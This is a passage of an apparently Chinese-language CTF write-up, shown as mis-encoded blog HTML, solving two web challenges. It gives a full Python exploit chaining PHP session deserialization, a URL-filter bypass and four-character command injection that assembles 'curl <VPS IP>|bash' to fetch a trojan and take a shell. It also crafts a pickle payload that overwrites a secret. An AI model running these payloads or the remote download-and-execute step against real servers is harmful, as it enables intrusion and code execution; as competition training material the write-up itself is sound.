class="keyword">$this</span>-&gt;sign;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;admin === <span class="number">1</span>) &#123;</span><br><span class="line">            redirect(<span class="string">'./core/index.php'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> info();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œ<code>session.serialize_handler</code>ç”¨çš„æ˜¯<code>PHP</code>ï¼Œè€Œ<code>init.php</code>ä¸­å¤„ç†å™¨çš„è®¾ç½®æ˜¯<code>php_serialize</code>è¿™æ ·å°±å¯ä»¥å‚è€ƒå‰é¢æåˆ°çš„<code>PHP session</code>çš„æ¼æ´äº†ã€‚<br>å†å¾€ä¸‹å®¡è®¡å‘ç°è¿™é‡Œå®šä¹‰äº†<code>info</code>ç±»ï¼Œå…¶ä¸­æœ‰<code>admin</code>å’Œ<code>sign</code>å±æ€§ï¼Œå¹¶ä¸”<code>__destruct()</code>ä¸­æŒ‡æ˜å¦‚æœ<code>admin===1</code>å°±ä¼šå®šå‘åˆ°<code>/core/index.php</code>ï¼Œè¿™æ˜¯ä¸ªä»€ä¹ˆæ–‡ä»¶ï¼Ÿå»çœ‹ä¸€ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'./init.php'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (check_session($_SESSION)) &#123;</span><br><span class="line">    <span class="comment">#å˜æˆç®¡ç†å‘˜å§ï¼Œå¥¥åˆ©ç»™</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'åªæœ‰ç®¡ç†å‘˜æ‰èƒ½çœ‹åˆ°æˆ‘å“Ÿ'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­¤å¤„æ— é“¶ä¸‰ç™¾ä¸¤äº†ï¼Œè§£é¢˜çš„å…³é”®è‚¯å®šåœ¨è¿™ï¼Œä½†æ˜¯è¿™ä¸ªåœ°æ–¹ä¼šå¯¹<code>$_SESSION</code>è¿›è¡Œæ£€æŸ¥ï¼Œå®ƒåˆåŒ…å«ä»€ä¹ˆå‘¢ï¼Ÿ<br>åœ¨<code>upload_sign.php</code>ä¸‹å‘ç°äº†å†…å®¹ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'init.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">upload_sign</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $sign;</span><br><span class="line">    <span class="keyword">public</span> $admin = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'sign'</span>])) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;sign = $_POST[<span class="string">'sign'</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;sign = <span class="string">"è¿™é‡Œç©ºç©ºå¦‚ä¹Ÿå“¦"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;checksign(<span class="keyword">$this</span>-&gt;sign)) &#123;</span><br><span class="line">            $_SESSION[<span class="string">'sign'</span>] = <span class="keyword">$this</span>-&gt;sign;</span><br><span class="line">            $_SESSION[<span class="string">'admin'</span>] = <span class="keyword">$this</span>-&gt;admin;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"???"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checksign</span><span class="params">($sign)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> upload_sign();</span><br><span class="line">$a-&gt;upload();</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œåœ¨è¿™é‡Œä¼šå¯¹<code>$_SESSION</code>ä¸­çš„<code>admin</code>å’Œ<code>sign</code>å±æ€§èµ‹å€¼ï¼Œä»è¿™é‡Œæˆ‘ä»¬ä¹Ÿå°±å¯ä»¥å¯¹<code>session</code>ä¸­çš„<code>admin</code>è¿›è¡Œæ§åˆ¶äº†ï¼Œå‚è€ƒ<a href="https://www.cnblogs.com/hf99/p/9746038.html">è¿™é‡Œ</a>ï¼Œå³åœ¨è®¾ç½®<code>sign</code>çš„é¡µé¢POSTä¸€ä¸ªé”®å€¼å¯¹ï¼Œå¹¶ä¸”å˜é‡åä¸<code>session.upload_progress.name</code>ç›¸åŒï¼Œå³å¯åœ¨<code>session</code>ä¸­å†™å…¥æ–°çš„å†…å®¹ã€‚</p><p>æ ¹æ®è¿™ä¸ªæ€è·¯ï¼Œæˆ‘ä»¬æ„é€ payloadï¼š</p><figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">ggb0n</span>|<span class="selector-tag">O</span><span class="selector-pseudo">:4</span><span class="selector-pseudo">:"info"</span><span class="selector-pseudo">:2</span>:&#123;<span class="attribute">s</span>:<span class="number">5</span>:<span class="string">"admin"</span>;<span class="attribute">i</span>:<span class="number">1</span>;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"sign"</span>;<span class="attribute">s</span>:<span class="number">0</span>:<span class="string">""</span>;&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ä¿®æ”¹<code>sign</code>çš„é¡µé¢æŠ“åŒ…ï¼Œå†™å…¥payloadï¼š<br><img src="http://www.ggb0n.cool/images/gxctf01.png" alt=""></p><p>ç»“æœæˆåŠŸè®¾ç½®ç­¾åï¼š<br><img src="http://www.ggb0n.cool/images/gxctf02.png" alt=""></p><p>ç°åœ¨å°±æ˜¯adminæƒé™äº†ï¼Œåˆ°<code>/core/</code>ä¸‹å‘ç°å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">./sandbox/ed04d2f141bd8a57cc5732b0ccf32456Â <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'./init.php'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>Â (check_session($_SESSION))Â &#123;</span><br><span class="line">Â Â Â Â <span class="comment">#hintÂ :Â core/clear.php</span></span><br><span class="line">Â Â Â Â $sandboxÂ =Â <span class="string">'./sandbox/'</span>Â .Â md5(<span class="string">"Mrk@1xI^"</span>Â .Â $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">Â Â Â Â <span class="keyword">echo</span>Â $sandbox;</span><br><span class="line">Â Â Â Â @mkdir($sandbox);</span><br><span class="line">Â Â Â Â @chdir($sandbox);</span><br><span class="line">Â Â Â Â <span class="keyword">if</span>Â (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>]))Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â $urlÂ =Â $_POST[<span class="string">'url'</span>];</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">if</span>Â (filter_var($url,Â FILTER_VALIDATE_URL))Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">if</span>Â (preg_match(<span class="string">'/(data:\/\/)|(&amp;)|(\|)|(\.\/)/i'</span>,Â $url))Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">echo</span>Â <span class="string">"youÂ areÂ hacker"</span>;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â &#125;Â <span class="keyword">else</span>Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â $resÂ =Â parse_url($url);</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">if</span>Â (preg_match(<span class="string">'/127\.0\.0\.1$/'</span>,Â $res[<span class="string">'host'</span>]))Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â $codeÂ =Â file_get_contents($url);</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">if</span>Â (strlen($code)Â &lt;=Â <span class="number">4</span>)Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â @exec($code);</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â &#125;Â <span class="keyword">else</span>Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">echo</span>Â <span class="string">"tryÂ again"</span>;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â &#125;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â &#125;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â &#125;</span><br><span class="line">Â Â Â Â Â Â Â Â &#125;Â <span class="keyword">else</span>Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">echo</span>Â <span class="string">"invalidÂ url"</span>;</span><br><span class="line">Â Â Â Â Â Â Â Â &#125;</span><br><span class="line">Â Â Â Â &#125;Â <span class="keyword">else</span>Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line">&#125;Â <span class="keyword">else</span>Â &#123;</span><br><span class="line">Â Â Â Â <span class="keyword">die</span>(<span class="string">'åªæœ‰ç®¡ç†å‘˜æ‰èƒ½çœ‹åˆ°æˆ‘å“Ÿ'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°ï¼Œæˆ‘ä»¬éœ€è¦åˆ©ç”¨<code>url</code>è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œå¹¶ä¸”<code>data://</code>è¢«banäº†ï¼Œè¿™é‡Œæƒ³åˆ°äº†ByteCTFä¸€é“é¢˜çš„ç»•è¿‡å§¿åŠ¿ï¼Œå…ˆæ”¾è¿™ï¼Œurlä¸­éœ€è¦æœ‰<code>127.0.0.1</code>æ‰èƒ½è¿›ä¸€æ­¥æ‰§è¡Œå‘½ä»¤ï¼Œå¯ä»¥å‚è€ƒ<a href="https://www.secpulse.com/archives/67064.html">å¦‚ä½•ç»•è¿‡URLé™åˆ¶</a>è¿™ç¯‡æ–‡ç« ï¼Œè¿™é‡Œç”¨<code>@</code>æ¥ç»•è¿‡ï¼Œç„¶ååˆ©ç”¨<code>compress.zlib://</code>æ¥æ»¡è¶³<code>file_get_contents</code>å‡½æ•°çš„è¯»å–ï¼ŒæˆåŠŸè¿‡ä¸€å¡ã€‚</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="symbol">'url</span><span class="string">':'</span>compress.zlib:<span class="comment">//data:@127.0.0.1/plain;base64,'</span></span><br></pre></td></tr></table></figure><p>æ­£å…¥ä¸‡å±±åœˆå­é‡Œå•Šâ€¦è¿˜è¦è¦æ±‚æ‰§è¡Œçš„å‘½ä»¤é•¿åº¦ä¸èƒ½è¶…è¿‡4â€¦æƒ³åˆ°äº†HITCONçš„ä¸€é“é¢˜ï¼Œ<a href="https://www.anquanke.com/post/id/87203">ç»•è¿‡å››å­—ç¬¦é™åˆ¶getshell</a>ï¼Œä¹Ÿå°±æ˜¯é€šè¿‡æŠŠå‘½ä»¤æ‹†è§£æˆå››å­—ç¬¦ä¸€ç»„æ¥æ‰§è¡Œå‘½ä»¤ã€‚</p><p>åˆ©ç”¨å‘½ä»¤çš„æ‰§è¡Œåˆ°VPSä¸Šä¸‹è½½æœ¨é©¬ï¼Œç„¶åæˆ‘ä»¬å°±èƒ½æ‹¿åˆ°shelläº†ï¼</p><h4 id="ç†ä¸€ä¸‹è§£é¢˜æ€è·¯"><a href="#ç†ä¸€ä¸‹è§£é¢˜æ€è·¯" class="headerlink" title="ç†ä¸€ä¸‹è§£é¢˜æ€è·¯"></a>ç†ä¸€ä¸‹è§£é¢˜æ€è·¯</h4><ul><li>1ã€åˆ©ç”¨PHP sessionçš„ååºåˆ—åŒ–æ¼æ´æˆä¸ºadminï¼Œè¯»å–<code>/core/index.php</code>å…³é”®ä»£ç </li><li>2ã€åˆ©ç”¨URLç»•è¿‡å§¿åŠ¿ç»•è¿‡å¯¹urlçš„é™åˆ¶</li><li>3ã€åˆ©ç”¨<code>compress.zlib:</code>è¿›è¡Œ<code>file_get_contents</code>å¯¹æ–‡ä»¶çš„è¯»å–</li><li>4ã€ç»•è¿‡å››å­—ç¬¦é™åˆ¶getshell</li></ul><h3 id="è§£é¢˜-1"><a href="#è§£é¢˜-1" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>å…³äºè§£é¢˜çš„ç¬¬å››æ­¥è¿˜æ˜¯è¦å¥½å¥½è¯´ä¸€ä¸‹çš„ï¼Œä¸ºäº†ä¸‹è½½æœ¨é©¬ï¼Œæˆ‘æŠŠè‡ªå·±çš„åšå®¢éƒ½åˆ äº†â€¦</p><p>å› ä¸ºæ˜¯ç”¨<code>curl</code>å‘½ä»¤æ¥åˆ°VPSä¸Šè¯»å–æœ¨é©¬çš„ä»£ç ï¼Œå› æ­¤åœ¨VPSä¸Šé…ç½®å¥½æœ¨é©¬æ–‡ä»¶å¾ˆé‡è¦ï¼Œåšé¢˜çš„æ—¶å€™è¿™é‡Œå°±å¡äº†å¾ˆä¹…ï¼Œè¿™ä¸€æ­¥ä¹Ÿéœ€è¦åœ¨æœ¬åœ°å¥½å¥½æµ‹è¯•ï¼Œä¿è¯æœ¨é©¬æ–‡ä»¶èƒ½æˆåŠŸè®¿é—®ã€‚</p><p>åœ¨VPSä¸Šé…ç½®å¥½æœ¨é©¬æ–‡ä»¶ä¹‹åï¼Œå°±å¯ä»¥é€šè¿‡urlä¼ å‚é€šè¿‡å››å­—ç¬¦æ‰§è¡Œå‘½ä»¤æ¥ä¸‹è½½æœ¨é©¬ï¼Œç„¶åæµè§ˆå™¨æ‹¿shelläº†ã€‚</p><p>å®Œæ•´çš„è§£é¢˜è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line">url = <span class="string">"http://121.36.222.22:88/login.php"</span></span><br><span class="line">s.post(url, data=&#123;<span class="string">'name'</span>:<span class="string">'ggb0n'</span>&#125;)</span><br><span class="line">url1 = <span class="string">"http://121.36.222.22:88/?page=upload"</span></span><br><span class="line">s.post(url1, data=&#123;<span class="string">'sign'</span>:<span class="string">'ggb0n|O:4:"info":2:&#123;s:5:"admin";i:1;s:4:"sign";s:0:"";&#125;'</span>&#125;)</span><br><span class="line">url3 = <span class="string">"http://121.36.222.22:88/core/index.php"</span></span><br><span class="line">s.get(url3)</span><br><span class="line"></span><br><span class="line">ip = <span class="string">'xx.xx.xx.xx'</span></span><br><span class="line">ip = <span class="string">'0x'</span> + <span class="string">''</span>.join([str(hex(int(i))[<span class="number">2</span>:].zfill(<span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> shell_ip.split(<span class="string">'.'</span>)])</span><br><span class="line"></span><br><span class="line">payload = [</span><br><span class="line">    <span class="comment"># å°† "g&gt; ht- sl" å†™åˆ°æ–‡ä»¶ "v"</span></span><br><span class="line">    <span class="string">'&gt;dir'</span>, </span><br><span class="line">    <span class="string">'&gt;sl'</span>, </span><br><span class="line">    <span class="string">'&gt;g\&gt;'</span>,</span><br><span class="line">    <span class="string">'&gt;ht-'</span>,</span><br><span class="line">    <span class="string">'*&gt;v'</span>,</span><br><span class="line">    <span class="comment"># å°†æ–‡ä»¶"v"ä¸­çš„å­—ç¬¦ä¸²å€’åºï¼Œæ”¾åˆ°æ–‡ä»¶"x"ï¼Œå°±å˜æˆäº† "ls -th &gt;g"</span></span><br><span class="line">    <span class="string">'&gt;rev'</span>,</span><br><span class="line">    <span class="string">'*v&gt;x'</span>,</span><br><span class="line">    <span class="comment"># generate `curl orange.tw.tw|python`</span></span><br><span class="line">    <span class="comment"># generate `curl 10.188.2.20|bash`</span></span><br><span class="line">    <span class="string">'&gt;p\ '</span>, </span><br><span class="line">    <span class="string">'&gt;ph\\'</span>, </span><br><span class="line">    <span class="string">'&gt;a.\\'</span>, </span><br><span class="line">    <span class="string">'&gt;\&gt;\\'</span>,</span><br><span class="line">    <span class="string">'&gt;%s\\'</span> % ip[<span class="number">8</span>:<span class="number">10</span>],</span><br><span class="line">    <span class="string">'&gt;%s\\'</span> % ip[<span class="number">6</span>:<span class="number">8</span>],</span><br><span class="line">    <span class="string">'&gt;%s\\'</span> % ip[<span class="number">4</span>:<span class="number">6</span>],</span><br><span class="line">    <span class="string">'&gt;%s\\'</span> % ip[<span class="number">2</span>:<span class="number">4</span>],</span><br><span class="line">    <span class="string">'&gt;%s\\'</span> % ip[<span class="number">0</span>:<span class="number">2</span>], </span><br><span class="line">    <span class="string">'&gt;\ \\'</span>, </span><br><span class="line">    <span class="string">'&gt;rl\\'</span>, </span><br><span class="line">    <span class="string">'&gt;cu\\'</span>, </span><br><span class="line">    </span><br><span class="line">    <span class="comment"># getshell</span></span><br><span class="line">    <span class="string">'sh x'</span>, </span><br><span class="line">    <span class="string">'sh g'</span>, </span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">payload_all = <span class="string">'compress.zlib://data:@127.0.0.1/plain;base64,&#123;0&#125;'</span></span><br><span class="line">r = requests.get(url3)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:               </span><br><span class="line">    r = requests.post(url3,data=&#123;<span class="string">"url"</span>:payload_all.format(base64.b64encode(i))&#125;)</span><br><span class="line">    <span class="keyword">print</span> r.text</span><br><span class="line">    print(data[<span class="string">'url'</span>])</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br></pre></td></tr></table></figure><p><img src="http://www.ggb0n.cool/images/gxctf03.png" alt=""></p><p>ä¸‹è½½æœ¨é©¬ä¹‹åï¼Œæµè§ˆå™¨æ‹¿shellï¼š<br><img src="http://www.ggb0n.cool/images/gxctf04.png" alt=""></p><p>æ•´ç†ä¸€ä¸‹å‚è€ƒçš„æ–‡ç« ï¼š<br><a href="https://www.cnblogs.com/hf99/p/9746038.html">https://www.cnblogs.com/hf99/p/9746038.html</a><br><a href="https://xz.aliyun.com/t/6640#toc-10">https://xz.aliyun.com/t/6640#toc-10</a><br><a href="https://www.anquanke.com/post/id/87203">https://www.anquanke.com/post/id/87203</a></p><h2 id="webtmp"><a href="#webtmp" class="headerlink" title="webtmp"></a>webtmp</h2><p>è€ƒå¯Ÿpickleçš„ååºåˆ—åŒ–åˆ©ç”¨</p><h3 id="é¢˜ç›®åˆ†æ-1"><a href="#é¢˜ç›®åˆ†æ-1" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿›å…¥é¢˜ç›®<br><img src="http://www.ggb0n.cool/images/gxctf05.png" alt=""></p><p>å¯ä»¥è¯»æºç ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response, render_template, request</span><br><span class="line"><span class="keyword">import</span> secret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, category)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.category = category</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f'Animal(name=<span class="subst">&#123;self.name!r&#125;</span>, category=<span class="subst">&#123;self.category!r&#125;</span>)'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__eq__</span><span class="params">(self, other)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> type(other) <span class="keyword">is</span> Animal <span class="keyword">and</span> self.name == other.name <span class="keyword">and</span> self.category == other.category</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span><span class="params">(pickle.Unpickler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">'__main__'</span>:</span><br><span class="line">            <span class="keyword">return</span> getattr(sys.modules[<span class="string">'__main__'</span>], name)</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">"global '%s.%s' is forbidden"</span> % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restricted_loads</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(filename, encoding=<span class="string">'utf-8'</span>)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(filename, <span class="string">'r'</span>, encoding=encoding) <span class="keyword">as</span> fin:</span><br><span class="line">        <span class="keyword">return</span> fin.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">'source'</span>):</span><br><span class="line">        <span class="keyword">return</span> Response(read(__file__), mimetype=<span class="string">'text/plain'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pickle_data = request.form.get(<span class="string">'data'</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b'R'</span> <span class="keyword">in</span> base64.b64decode(pickle_data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'No... I don\'t like R-things. No Rabits, Rats, Roosters or RCEs.'</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result = restricted_loads(base64.b64decode(pickle_data))</span><br><span class="line">                <span class="keyword">if</span> type(result) <span class="keyword">is</span> <span class="keyword">not</span> Animal:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">'Are you sure that is an animal???'</span></span><br><span class="line">            correct = (result == Animal(secret.name, secret.category))</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'unpickle_result.html'</span>, result=result, pickle_data=pickle_data, giveflag=correct)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(repr(e))</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Something wrong"</span></span><br><span class="line"></span><br><span class="line">    sample_obj = Animal(<span class="string">'ä¸€ç»™æˆ‘å“©giaogiao'</span>, <span class="string">'Giao'</span>)</span><br><span class="line">    pickle_data = base64.b64encode(pickle.dumps(sample_obj)).decode()</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'unpickle_page.html'</span>, sample_obj=sample_obj, pickle_data=pickle_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>åŸºäºflaskçš„ç¯å¢ƒï¼Œå¹¶ä¸”é‡‡ç”¨äº†pickle</p><p>ç»“åˆé¢˜ç›®æè¿°ï¼š</p><blockquote><p>Sample animal: Animal(name=â€™ä¸€ç»™æˆ‘å“©giaogiaoâ€™, category=â€™Giaoâ€™)</p><p>Pickled data: gANjX19tYWluX18KQW5pbWFsCnEAKYFxAX1xAihYBAAAAG5hbWVxA1gUAAAA5LiA57uZ5oiR5ZOpZ2lhb2dpYW9xBFgIAAAAY2F0ZWdvcnlxBVgEAAAAR2lhb3EGdWIu</p><p>I will give you the flag if we share the same animal as our favourite.</p></blockquote><p>å¯çŸ¥ï¼Œæˆ‘ä»¬éœ€è¦æ„é€ ä¸€ä¸ªä¸é¢˜ç›®<code>secret</code>ä¸­ä¸€æ ·çš„<code>Animal</code>ç±»æ‰èƒ½æ‹¿åˆ°flagï¼Œå‘½ä»¤æ‰§è¡Œæ˜¯ä¸èƒ½çš„ï¼Œå› ä¸º<code>R</code>è¢«banäº†ï¼Œæˆ‘ä»¬åˆä¸å¯èƒ½çŸ¥é“secretä¸­<code>Animal</code>çš„å±æ€§å€¼ã€‚</p><p>ä½†æ˜¯ä»<a href="https://www.anquanke.com/post/id/188981#h3-8">è¿™ç¯‡æ–‡ç« </a>å¾—åˆ°äº†æç¤ºï¼šå­˜åœ¨<code>b</code>è¿™ä¸ªæŒ‡ä»¤ï¼ˆcall __setstate__ or__dict__.update()ï¼‰ï¼Œå¯ä»¥æ›´æ–°å­—å…¸ï¼Œè¿™æ ·çš„è¯æˆ‘ä»¬å°±å¯ä»¥å…ˆè¦†ç›–<code>secret</code>ä¸­åŸæœ‰çš„å€¼ï¼Œç„¶åå†™å…¥æˆ‘ä»¬æ„é€ çš„é”®å€¼å¯¹åˆ°å­—å…¸ä¸­ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å†æ„é€ <code>Animal</code>ç±»æ»¡è¶³é¢˜ç›®è¦æ±‚ï¼ŒæˆåŠŸæ‹¿åˆ°flagäº†ã€‚</p><p>å‚è€ƒä¸Šé¢é‚£ç¯‡æ–‡ç« çš„æŒ‡ä»¤é›†ï¼Œæ„é€ äº†å¦‚ä¸‹çš„åºåˆ—åŒ–æŒ‡ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c__main__\nsecret\np0\n(dp1\nS&#39;category&#39;\np2\nS&#39;ggb0n&#39;\np3\nsS&#39;name&#39;\np4\nS&#39;ggb0n&#39;\np5\nsb.</span><br></pre></td></tr></table></figure><p>æ³¨æ„è¿™é‡Œçš„<code>\n</code>æ¢è¡Œç¬¦ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªå·¨å‘â€¦åˆšå¼€å§‹åœ¨Windowsä¸‹æ„é€ çš„payloadçš„base64ä¹‹åæäº¤åé¦ˆ<code>Somethin wrong</code>ï¼Œåæ¥ç»å¸ˆå‚…æç¤ºè¯´pickleå¯¹æ¢è¡Œç¬¦çš„<code>\r</code>ä¸èƒ½è¯†åˆ«â€¦æ¶¨çŸ¥è¯†â€¦</p><p>ä¸¤ç§æ–¹æ³•ï¼š</p><ul><li>1ã€<code>å­—ç¬¦ä¸²å¯¹è±¡.replaceAll(&quot;\r&quot;, &quot;&quot;);</code></li><li>2ã€åˆ°Linuxä¸­å»åŠ å¯†</li></ul><p>é€‰æ‹©äº†å»Linuxä¸­åŠ å¯†ï¼š<br><img src="http://www.ggb0n.cool/images/gxctf07.png" alt=""></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#æ³¨æ„åœ¨Linuxä¸‹</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">"c__main__\nsecret\np0\n(dp1\nS'category'\np2\nS'ggb0n'\np3\nsS'name'\np4\nS'ggb0n'\np5\nsb."</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = base64.b64encode(s)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line"><span 